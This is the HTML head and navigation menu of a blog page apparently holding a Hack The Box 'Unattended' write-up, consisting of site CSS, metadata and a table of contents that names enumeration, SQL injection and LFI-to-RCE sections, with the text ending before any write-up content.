<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="generator" content="Hugo 0.99.1" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
<style>
button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}
*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:before,:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}
input,button,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}
.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}
[role="button"]{cursor: pointer;}
.container{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}@media (min-width: 768px){.container{width:750px}}@media (min-width: 992px){.container{width:970px}}@media (min-width: 1200px){.container{width:1170px}}.container-fluid{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}.row{margin-left:-15px;margin-right:-15px}
.col-xs-1, .col-sm-1, .col-md-1, .col-lg-1, .col-xs-2, .col-sm-2, .col-md-2, .col-lg-2, .col-xs-3, .col-sm-3, .col-md-3, .col-lg-3, .col-xs-4, .col-sm-4, .col-md-4, .col-lg-4, .col-xs-5, .col-sm-5, .col-md-5, .col-lg-5, .col-xs-6, .col-sm-6, .col-md-6, .col-lg-6, .col-xs-7, .col-sm-7, .col-md-7, .col-lg-7, .col-xs-8, .col-sm-8, .col-md-8, .col-lg-8, .col-xs-9, .col-sm-9, .col-md-9, .col-lg-9, .col-xs-10, .col-sm-10, .col-md-10, .col-lg-10, .col-xs-11, .col-sm-11, .col-md-11, .col-lg-11, .col-xs-12, .col-sm-12, .col-md-12, .col-lg-12 { position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; }
@media (min-width: 768px){.col-sm-1,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-10,.col-sm-11,.col-sm-12{float:left}.col-sm-12{width:100%}.col-sm-11{width:91.66666667%}.col-sm-10{width:83.33333333%}.col-sm-9{width:75%}.col-sm-8{width:66.66666667%}.col-sm-7{width:58.33333333%}.col-sm-6{width:50%}.col-sm-5{width:41.66666667%}.col-sm-4{width:33.33333333%}.col-sm-3{width:25%}.col-sm-2{width:16.66666667%}.col-sm-1{width:8.33333333%}.col-sm-pull-12{right:100%}.col-sm-pull-11{right:91.66666667%}.col-sm-pull-10{right:83.33333333%}.col-sm-pull-9{right:75%}.col-sm-pull-8{right:66.66666667%}.col-sm-pull-7{right:58.33333333%}.col-sm-pull-6{right:50%}.col-sm-pull-5{right:41.66666667%}.col-sm-pull-4{right:33.33333333%}.col-sm-pull-3{right:25%}.col-sm-pull-2{right:16.66666667%}.col-sm-pull-1{right:8.33333333%}.col-sm-pull-0{right:auto}.col-sm-push-12{left:100%}.col-sm-push-11{left:91.66666667%}.col-sm-push-10{left:83.33333333%}.col-sm-push-9{left:75%}.col-sm-push-8{left:66.66666667%}.col-sm-push-7{left:58.33333333%}.col-sm-push-6{left:50%}.col-sm-push-5{left:41.66666667%}.col-sm-push-4{left:33.33333333%}.col-sm-push-3{left:25%}.col-sm-push-2{left:16.66666667%}.col-sm-push-1{left:8.33333333%}.col-sm-push-0{left:auto}.col-sm-offset-12{margin-left:100%}.col-sm-offset-11{margin-left:91.66666667%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-0{margin-left:0}}@media (min-width: 992px){.col-md-1,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-10,.col-md-11,.col-md-12{float:left}.col-md-12{width:100%}.col-md-11{width:91.66666667%}.col-md-10{width:83.33333333%}.col-md-9{width:75%}.col-md-8{width:66.66666667%}.col-md-7{width:58.33333333%}.col-md-6{width:50%}.col-md-5{width:41.66666667%}.col-md-4{width:33.33333333%}.col-md-3{width:25%}.col-md-2{width:16.66666667%}.col-md-1{width:8.33333333%}.col-md-pull-12{right:100%}.col-md-pull-11{right:91.66666667%}.col-md-pull-10{right:83.33333333%}.col-md-pull-9{right:75%}.col-md-pull-8{right:66.66666667%}.col-md-pull-7{right:58.33333333%}.col-md-pull-6{right:50%}.col-md-pull-5{right:41.66666667%}.col-md-pull-4{right:33.33333333%}.col-md-pull-3{right:25%}.col-md-pull-2{right:16.66666667%}.col-md-pull-1{right:8.33333333%}.col-md-pull-0{right:auto}.col-md-push-12{left:100%}.col-md-push-11{left:91.66666667%}.col-md-push-10{left:83.33333333%}.col-md-push-9{left:75%}.col-md-push-8{left:66.66666667%}.col-md-push-7{left:58.33333333%}.col-md-push-6{left:50%}.col-md-push-5{left:41.66666667%}.col-md-push-4{left:33.33333333%}.col-md-push-3{left:25%}.col-md-push-2{left:16.66666667%}.col-md-push-1{left:8.33333333%}.col-md-push-0{left:auto}.col-md-offset-12{margin-left:100%}.col-md-offset-11{margin-left:91.66666667%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-9{margin-left:75%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-6{margin-left:50%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-3{margin-left:25%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-0{margin-left:0}}
label { display: inline-block; max-width: 100%; margin-bottom: 5px; font-weight: bold; }
.btn{display:inline-block;margin-bottom:0;font-weight:400;text-align:center;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;background-image:none;border:1px solid transparent;white-space:nowrap;padding:6px 12px;font-size:16px;line-height:1.4;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.btn:focus,.btn:active:focus,.btn.active:focus,.btn.focus,.btn:active.focus,.btn.active.focus{outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.btn:hover,.btn:focus,.btn.focus{color:#333;text-decoration:none}.btn:active,.btn.active{outline:0;background-image:none;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}.btn.disabled,.btn[disabled],fieldset[disabled] .btn{cursor:not-allowed;opacity:.65;filter:alpha(opacity=65);-webkit-box-shadow:none;box-shadow:none}a.btn.disabled,fieldset[disabled] a.btn{pointer-events:none}.btn-default{color:#333;background-color:#fff;border-color:#ccc}.btn-default:focus,.btn-default.focus{color:#333;background-color:#e6e6e6;border-color:#8c8c8c}.btn-default:hover{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active:hover,.btn-default.active:hover,.open > .dropdown-toggle.btn-default:hover,.btn-default:active:focus,.btn-default.active:focus,.open > .dropdown-toggle.btn-default:focus,.btn-default:active.focus,.btn-default.active.focus,.open > .dropdown-toggle.btn-default.focus{color:#333;background-color:#d4d4d4;border-color:#8c8c8c}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{background-image:none}.btn-default.disabled:hover,.btn-default[disabled]:hover,fieldset[disabled] .btn-default:hover,.btn-default.disabled:focus,.btn-default[disabled]:focus,fieldset[disabled] .btn-default:focus,.btn-default.disabled.focus,.btn-default[disabled].focus,fieldset[disabled] .btn-default.focus{background-color:#fff;border-color:#ccc}.btn-default .badge{color:#fff;background-color:#333}.btn-primary{color:#fff;background-color:#195eff;border-color:#004cff}.btn-primary:focus,.btn-primary.focus{color:#fff;background-color:#0045e5;border-color:#00267f}.btn-primary:hover{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active:hover,.btn-primary.active:hover,.open > .dropdown-toggle.btn-primary:hover,.btn-primary:active:focus,.btn-primary.active:focus,.open > .dropdown-toggle.btn-primary:focus,.btn-primary:active.focus,.btn-primary.active.focus,.open > .dropdown-toggle.btn-primary.focus{color:#fff;background-color:#003ac1;border-color:#00267f}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{background-image:none}.btn-primary.disabled:hover,.btn-primary[disabled]:hover,fieldset[disabled] .btn-primary:hover,.btn-primary.disabled:focus,.btn-primary[disabled]:focus,fieldset[disabled] .btn-primary:focus,.btn-primary.disabled.focus,.btn-primary[disabled].focus,fieldset[disabled] .btn-primary.focus{background-color:#195eff;border-color:#004cff}.btn-primary .badge{color:#195eff;background-color:#fff}.btn-success{color:#fff;background-color:#00bc16;border-color:#00a313}.btn-success:focus,.btn-success.focus{color:#fff;background-color:#008910;border-color:#002304}.btn-success:hover{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active:hover,.btn-success.active:hover,.open > .dropdown-toggle.btn-success:hover,.btn-success:active:focus,.btn-success.active:focus,.open > .dropdown-toggle.btn-success:focus,.btn-success:active.focus,.btn-success.active.focus,.open > .dropdown-toggle.btn-success.focus{color:#fff;background-color:#00650c;border-color:#002304}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{background-image:none}.btn-success.disabled:hover,.btn-success[disabled]:hover,fieldset[disabled] .btn-success:hover,.btn-success.disabled:focus,.btn-success[disabled]:focus,fieldset[disabled] .btn-success:focus,.btn-success.disabled.focus,.btn-success[disabled].focus,fieldset[disabled] .btn-success.focus{background-color:#00bc16;border-color:#00a313}.btn-success .badge{color:#00bc16;background-color:#fff}.btn-info{color:#fff;background-color:#5bc0de;border-color:#46b8da}.btn-info:focus,.btn-info.focus{color:#fff;background-color:#31b0d5;border-color:#1b6d85}.btn-info:hover{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active:hover,.btn-info.active:hover,.open > .dropdown-toggle.btn-info:hover,.btn-info:active:focus,.btn-info.active:focus,.open > .dropdown-toggle.btn-info:focus,.btn-info:active.focus,.btn-info.active.focus,.open > .dropdown-toggle.btn-info.focus{color:#fff;background-color:#269abc;border-color:#1b6d85}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{background-image:none}.btn-info.disabled:hover,.btn-info[disabled]:hover,fieldset[disabled] .btn-info:hover,.btn-info.disabled:focus,.btn-info[disabled]:focus,fieldset[disabled] .btn-info:focus,.btn-info.disabled.focus,.btn-info[disabled].focus,fieldset[disabled] .btn-info.focus{background-color:#5bc0de;border-color:#46b8da}.btn-info .badge{color:#5bc0de;background-color:#fff}.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}.btn-warning:focus,.btn-warning.focus{color:#fff;background-color:#ec971f;border-color:#985f0d}.btn-warning:hover{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active:hover,.btn-warning.active:hover,.open > .dropdown-toggle.btn-warning:hover,.btn-warning:active:focus,.btn-warning.active:focus,.open > .dropdown-toggle.btn-warning:focus,.btn-warning:active.focus,.btn-warning.active.focus,.open > .dropdown-toggle.btn-warning.focus{color:#fff;background-color:#d58512;border-color:#985f0d}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{background-image:none}.btn-warning.disabled:hover,.btn-warning[disabled]:hover,fieldset[disabled] .btn-warning:hover,.btn-warning.disabled:focus,.btn-warning[disabled]:focus,fieldset[disabled] .btn-warning:focus,.btn-warning.disabled.focus,.btn-warning[disabled].focus,fieldset[disabled] .btn-warning.focus{background-color:#f0ad4e;border-color:#eea236}.btn-warning .badge{color:#f0ad4e;background-color:#fff}.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}.btn-danger:focus,.btn-danger.focus{color:#fff;background-color:#c9302c;border-color:#761c19}.btn-danger:hover{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active:hover,.btn-danger.active:hover,.open > .dropdown-toggle.btn-danger:hover,.btn-danger:active:focus,.btn-danger.active:focus,.open > .dropdown-toggle.btn-danger:focus,.btn-danger:active.focus,.btn-danger.active.focus,.open > .dropdown-toggle.btn-danger.focus{color:#fff;background-color:#ac2925;border-color:#761c19}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{background-image:none}.btn-danger.disabled:hover,.btn-danger[disabled]:hover,fieldset[disabled] .btn-danger:hover,.btn-danger.disabled:focus,.btn-danger[disabled]:focus,fieldset[disabled] .btn-danger:focus,.btn-danger.disabled.focus,.btn-danger[disabled].focus,fieldset[disabled] .btn-danger.focus{background-color:#d9534f;border-color:#d43f3a}.btn-danger .badge{color:#d9534f;background-color:#fff}.btn-link{color:#000;font-weight:400;border-radius:0}.btn-link,.btn-link:active,.btn-link.active,.btn-link[disabled],fieldset[disabled] .btn-link{background-color:transparent;-webkit-box-shadow:none;box-shadow:none}.btn-link,.btn-link:hover,.btn-link:focus,.btn-link:active{border-color:transparent}.btn-link:hover,.btn-link:focus{color:#000;text-decoration:none;background-color:transparent}.btn-link[disabled]:hover,fieldset[disabled] .btn-link:hover,.btn-link[disabled]:focus,fieldset[disabled] .btn-link:focus{color:#777;text-decoration:none}.btn-lg{padding:10px 16px;font-size:20px;line-height:1.3333333;border-radius:6px}.btn-sm{padding:5px 10px;font-size:14px;line-height:1.5;border-radius:3px}.btn-xs{padding:1px 5px;font-size:14px;line-height:1.5;border-radius:3px}.btn-block{display:block;width:100%}.btn-block + .btn-block{margin-top:5px}
.dropup,.dropdown{position:relative}.dropdown-toggle:focus{outline:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;list-style:none;font-size:16px;text-align:left;background-color:#fff;border:1px solid #ccc;border:1px solid rgba(0,0,0,0.15);border-radius:4px;-webkit-box-shadow:0 6px 12px rgba(0,0,0,0.175);box-shadow:0 6px 12px rgba(0,0,0,0.175);-webkit-background-clip:padding-box;background-clip:padding-box}.dropdown-menu.pull-right{right:0;left:auto}.dropdown-menu .divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.dropdown-menu > li > a{display:block;padding:3px 10px;clear:both;font-weight:400;line-height:1.4;color:#333;white-space:nowrap}.dropdown-menu > li > a:hover,.dropdown-menu > li > a:focus{text-decoration:none;color:#262626;background-color:#f5f5f5}.dropdown-menu > .active > a,.dropdown-menu > .active > a:hover,.dropdown-menu > .active > a:focus{color:#fff;text-decoration:none;outline:0;background-color:#195eff}.dropdown-menu > .disabled > a,.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{color:#777}.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{text-decoration:none;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);cursor:not-allowed}.open > .dropdown-menu{display:block}.open > a{outline:0}.dropdown-menu-right{left:auto;right:0}.dropdown-menu-left{left:0;right:auto}.dropdown-header{display:block;padding:3px 10px;font-size:14px;line-height:1.4;color:#777;white-space:nowrap}.dropdown-backdrop{position:fixed;left:0;right:0;bottom:0;top:0;z-index:990}.pull-right > .dropdown-menu{right:0;left:auto}.dropup .caret,.navbar-fixed-bottom .dropdown .caret{border-top:0;border-bottom:4px dashed;border-bottom:4px solid \9;content:""}.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:2px}
.nav{margin-bottom:0;padding-left:0;list-style:none}.nav > li{position:relative;display:block}.nav > li > a{position:relative;display:block;padding:5px 10px}.nav > li > a:hover,.nav > li > a:focus{text-decoration:none;background-color:#a52a2a}.nav > li.disabled > a{color:#777}.nav > li.disabled > a:hover,.nav > li.disabled > a:focus{color:#777;text-decoration:none;background-color:transparent;cursor:not-allowed}.nav .open > a,.nav .open > a:hover,.nav .open > a:focus{background-color:#a52a2a;border-color:#000}.nav .nav-divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.nav > li > a > img{max-width:none}.nav-pills > li{float:left}.nav-pills > li > a{border-radius:4px}.nav-pills > li + li{margin-left:2px}.nav-pills > li.active > a,.nav-pills > li.active > a:hover,.nav-pills > li.active > a:focus{color:#fff;background-color:#195eff}.nav-stacked > li{float:none}.nav-stacked > li + li{margin-top:0px;margin-left:0}.navbar{position:relative;min-height:48px;max-height:48px;margin-bottom:22px;border:1px solid transparent}@media (min-width: 768px){.navbar{border-radius:4px}}@media (max-device-width: 480px) and (orientation: landscape){.navbar-fixed-top .navbar-collapse,.navbar-fixed-bottom .navbar-collapse{max-height:200px}}.navbar-static-top{z-index:1000;border-width:0 0 1px}@media (min-width: 768px){.navbar-static-top{border-radius:0}}.navbar-fixed-top,.navbar-fixed-bottom{position:fixed;right:0;left:0;z-index:1030}@media (min-width: 768px){.navbar-fixed-top,.navbar-fixed-bottom{border-radius:0}}.navbar-fixed-top{top:0;border-width:0 0 1px}.navbar-fixed-bottom{bottom:0;margin-bottom:0;border-width:1px 0 0}@media (min-width: 768px){.navbar > .container .navbar-brand,.navbar > .container-fluid .navbar-brand{margin-left:-15px}}.navbar-fixed-bottom .navbar-nav > li > .dropdown-menu{margin-bottom:0;border-top-right-radius:4px;border-top-left-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.navbar-default{background-color:#7d1935;border-color:#611329}.navbar-default .navbar-nav > li > a{color:#fff}.navbar-default .navbar-nav > li > a:hover,.navbar-default .navbar-nav > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav > .active > a,.navbar-default .navbar-nav > .active > a:hover,.navbar-default .navbar-nav > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav > .disabled > a,.navbar-default .navbar-nav > .disabled > a:hover,.navbar-default .navbar-nav > .disabled > a:focus{color:#ccc;background-color:transparent}.navbar-default .navbar-toggle{border-color:#a52a2a}.navbar-default .navbar-toggle:hover,.navbar-default .navbar-toggle:focus{background-color:#a52a2a}.navbar-default .navbar-toggle .icon-bar{background-color:#888}.navbar-default .navbar-collapse,.navbar-default .navbar-form{border-color:#611329}.navbar-default .navbar-nav > .open > a,.navbar-default .navbar-nav > .open > a:hover,.navbar-default .navbar-nav > .open > a:focus{background-color:#611329;color:#fff}@media (max-width: 767px){.navbar-default .navbar-nav .open .dropdown-menu > li > a{color:#fff}.navbar-default .navbar-nav .open .dropdown-menu > li > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav .open .dropdown-menu > .active > a,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:focus{color:#ccc;background-color:transparent}}.navbar-default .navbar-link{color:#fff}.navbar-default .navbar-link:hover{color:#fff}.navbar-default .btn-link{color:#fff}.navbar-default .btn-link:hover,.navbar-default .btn-link:focus{color:#fff}
.label{display:inline;padding:.2em .6em .3em;font-size:75%;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25em}a.label:hover,a.label:focus{color:#fff;text-decoration:none;cursor:pointer}.label:empty{display:none}.btn .label{position:relative;top:-1px}.label-default{background-color:#777}.label-default[href]:hover,.label-default[href]:focus{background-color:#5e5e5e}.label-primary{background-color:#195eff}.label-primary[href]:hover,.label-primary[href]:focus{background-color:#0045e5}.label-success{background-color:#00bc16}.label-success[href]:hover,.label-success[href]:focus{background-color:#008910}.label-info{background-color:#5bc0de}.label-info[href]:hover,.label-info[href]:focus{background-color:#31b0d5}.label-warning{background-color:#f0ad4e}.label-warning[href]:hover,.label-warning[href]:focus{background-color:#ec971f}.label-danger{background-color:#d9534f}.label-danger[href]:hover,.label-danger[href]:focus{background-color:#c9302c}.badge{display:inline-block;min-width:10px;padding:3px 7px;font-size:14px;font-weight:700;color:#fff;line-height:1;vertical-align:middle;white-space:nowrap;text-align:center;background-color:#000;border-radius:10px}.badge:empty{display:none}.btn .badge{position:relative;top:-1px}.btn-xs .badge,.btn-group-xs > .btn .badge{top:0;padding:1px 5px}a.badge:hover,a.badge:focus{color:#fff;text-decoration:none;cursor:pointer}
.nav-pills > .active > a > .badge{color:#000;background-color:#fff}.nav-pills > li > a > .badge{margin-left:3px}
.clearfix:before,.clearfix:after,.container:before,.container:after,.container-fluid:before,.container-fluid:after,.row:before,.row:after,.form-horizontal .form-group:before,.form-horizontal .form-group:after,.nav:before,.nav:after,.navbar:before,.navbar:after,.navbar-header:before,.navbar-header:after,.navbar-collapse:before,.navbar-collapse:after{content:" ";display:table}.clearfix:after,.container:after,.container-fluid:after,.row:after,.form-horizontal .form-group:after,.nav:after,.navbar:after,.navbar-header:after,.navbar-collapse:after{clear:both}
.pull-right { float: right !important; } .pull-left { float: left !important; }

 
html { font-size:16px; }
body:not(.en) :lang(en), body:not(.el) :lang(el), body:not(.fr) :lang(fr) { display: none; }
body {
  font-size: 16px; line-height: 1.45; color: #000000;  background-color: #eceff1;
  margin: 0; padding-top: 70px; 
  font-family: 'Open Sans', 'Times New Roman', sans-serif;
  -webkit-animation: bugfix infinite 1s;
}
@-webkit-keyframes bugfix { from { fill: 0; } to { fill: 0; } }

a { color: #000; word-wrap: break-word; text-decoration: none; }
a:hover, a:focus, a:active { color: black; text-decoration: none; }
a.label { box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
figure {  display: table; margin: 10px auto; }
figure figcaption { caption-side: bottom; color: darkblue; display: table-caption;
font-size: 14px; margin-top: 5px; text-align:justify; }
h1, h2, h3, h4, h5, h6 { margin:0px; text-align: justify; }
img { max-width: 100%; }
img.bordered { border:1px solid #021a40;  border-radius:20px; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
li { line-height: 1.5rem; text-align:justify; }
p { text-align:justify; text-indent: 30px; }
section { margin-top: 1rem; margin-bottom: 1rem; }
section>header { margin-bottom: .3rem; }
ul, ol { padding-left: 1.5rem; }

article .image { background-size: cover; background-position: center; }
article time { font-size: .8rem; }
article.grid { max-width:384px; margin-bottom:0.5rem; height:26rem; overflow: hidden; }
article.grid .image { min-height: 12rem; }
article.grid footer { padding: 1rem; background-color: #ffffe6; }
article.grid .title { overflow: hidden; }
article.grid .summary { color: #333; font-size: .8rem; line-height: 1rem; max-height: 5rem; overflow: hidden; }
article.single { background-color: #fff; margin: 0 auto; padding-bottom: 1rem; max-width:1200px; }
article.single .image { max-width:786px; min-height: 24rem; margin-left:auto; margin-right:auto; }
article.single .body { margin-bottom: 2rem;  padding: 0 5rem; }
article.single .body a:not(.label) { color: #78909c; text-decoration: underline; }
article.single .body>h1, article.single .body>h2, article.single .body>h3 { padding-top: 60px; margin-top: -30px; margin-bottom: 0.5rem; }
article.single .body li {  margin: 0.5rem auto; }
article.li { margin-bottom: .5rem; font-size: .8rem; line-height: 1rem; }
article.li .cell { display:table-cell; vertical-align: middle; }
article.li .image { width: 4.1rem; height: 4.1rem; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
article.li footer { display:table-cell; vertical-align: middle; padding-left: .5rem;  }
article.li time { font-size: .7rem; }
article.li .title { font-size: 0.85rem; line-height: 1rem; font-weight: 700; }

.body .title { font-size: 2rem; line-height: 3rem; margin: 0.5rem auto; }
.label { display:inline-block; padding-top: 0.25rem; }

.navbar * { color: white !important; }
.navbar .dropdown-menu a:hover { background-color: brown; }
.nav>li>a:hover, .nav>li>a:focus { color: white; background-color: brown; }
.nav-pills { display: inline-block; margin: 0; }
.nav-pills>li.active>a { font-weight: 700 !important; background-color: #00bc16 !important; }
.nav-pills>li.active>a .badge { color: #00bc16; }
.cssdropdown { margin-top: 2rem; }
.cssdropdown input[type=checkbox], .cssdropdown ul { display: none; }
.cssdropdown label { font-size: 1.25rem; font-weight:700; min-width: 300px; }
.cssdropdown input[type=checkbox]:checked ~ ul { display: table-cell; }

.p-logo {
  font-family: 'Comic Sans MS', cursive; font-weight: bold; font-size: 2rem;
  text-shadow: 4px 2px 2px rgba(0,0,0,0.75);
  margin-top: 3px;
}
.l-footer * { color: white; }
.l-footer { background-color: #7D1935; padding: 0.75rem 0; text-align: center; }

.lgfont { font-size: 2rem; }
.margin-sm { margin: 0.5rem; }
.side-margins-1 { margin-left: 1rem !important; margin-right: 1rem !important; }
.side-margins-2 { margin-left: 2rem !important;; margin-right: 2rem !important; }
.margin-top-sm {  margin-top: 0.5rem; }
.topmargin5 {  margin-top: 5px; }
.topmargin7 { margin-top: 7px; }

#search-section, #results-section { display:none; }
#TableOfContents ul { list-style: none; }
#TableOfContents>ul {  padding-left: 0; font-weight: 700; }
#TableOfContents>ul ul { font-weight: normal; }

.summary { text-align:justify; }
.max-width640 { max-width: 640px; }
.floatleft { float:left; margin-right: 10px; }
.floatright { float:right; margin-left: 10px; }

.centered { margin-left: auto !important;  margin-right: auto !important; }
img.centered { display:block !important; }
div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.centered, h2.centered, h3.centered { text-align:center !important; }

@media (max-width: 768px) {
  h1 { font-size: 1.4rem; line-height: 1.5rem; }
  h2 { font-size: 1.2rem; line-height: 1.5rem; }
  article.single .image { min-height: 12rem; }
  article.single .body pre { margin: 1rem -1rem; }
  article.single .body pre code { padding: 1rem 1rem; }
  article.single .body { padding: 0 1rem; }
  ul.scroll-menu { max-height: 250px; }
  .cssdropdown label, .nav-stacked>li>a { min-width: 240px; }
  .hidden768 { display:none; }
  .text-smaller {
    font-family: 'Open Sans', 'Times New Roman', sans-serif;
    font-size: 1rem;  font-weight: 700; letter-spacing: -1px;
    padding-left: 0px !important;  padding-right: 0px !important;
    line-height:32px;
  }
}
</style>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://alamot.github.io/index.xml">

  <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />


  <title>Unattended (Hack The Box) write-up - The Portal of Knowledge</title>
  <meta property='og:title' content="Unattended (Hack The Box) write-up - The Portal of Knowledge">
  <meta property="og:type" content="article">
  <meta name="description" content="Write-up for the Unattended machine. Ανάλυση του μηχανήματος Unattended (διαθέσιμη μόνο στα αγγλικά).">
  <meta property="og:description" content="Write-up for the Unattended machine. Ανάλυση του μηχανήματος Unattended (διαθέσιμη μόνο στα αγγλικά).">
  <meta property="og:image" content="https://alamot.github.io/images/unattended.jpg">
  <meta property="og:image:width" content="768" />
  <meta property="og:image:height" content="384" />

<meta property="og:url" content="https://alamot.github.io/unattended_writeup/">


<script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "mainEntityOfPage":{
      "@type":"WebPage",
      "@id":"https:\/\/alamot.github.io\/"
    },
    "headline": "Unattended (Hack The Box) write-up |  ",
    "image": {
      "@type": "ImageObject",
      "url": "",
      "height": 700,
      "width": 700
    },
    "datePublished": "2019-08-23T00:00:00JST",
    "dateModified": "2019-08-23T00:00:00JST",
    "author": {
      "@type": "Person",
      "name": "Antonios Tsolis",
      "image": "https:\/\/alamot.github.io\/images/logo.png"
    },
    "publisher": {
      "@type": "Organization",
      "name": "",
      "logo": {
        "@type": "ImageObject",
        "url": "https:\/\/alamot.github.io\/images/logo.png",
        "height": 60,
        "width": 60
      }
    },
    "description": ""
  }
</script>
</head>
<body id="mainbody" class="en" lang="en">
<nav class="navbar navbar-default navbar-fixed-top centered">
<div class="container-fluid">
  
   <ul class="nav nav-pills pull-left topmargin7">
    <li id="content-selector" role="presentation" class="dropdown">
    <a class="dropdown-toggle btn-danger" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false"><span lang="en">Contents</span><span lang="el">Περιεχόμενα</span> <i class="fa fa-caret-down" aria-hidden="true"></i></a>
      <ul class="dropdown-menu scroll-menu">
        <li><a href="#title"><span lang="en">Start</span><span lang="el">Αρχή</span></a></li>
        
        
        
         
<li><a href="#introduction">Introduction</a></li>
<li><a href="#enumeration">Enumeration</a>
<ul>
<li><a href="#port-scanning">Port scanning</a></li>
<li><a href="#brute-forcing-directories-and-files">Brute-forcing directories and files</a></li>
</ul></li>
<li><a href="#exploitation">Exploitation</a>
<ul>
<li><a href="#sql-injection">SQL Injection</a></li>
<li><a href="#nested-sql-injection-lfi">Nested SQL Injection (LFI)</a></li>
<li><a href="#lfi-to-rce-via-php-session-poisoning">LFI to RCE (via PHP session poisoning)</a></li>
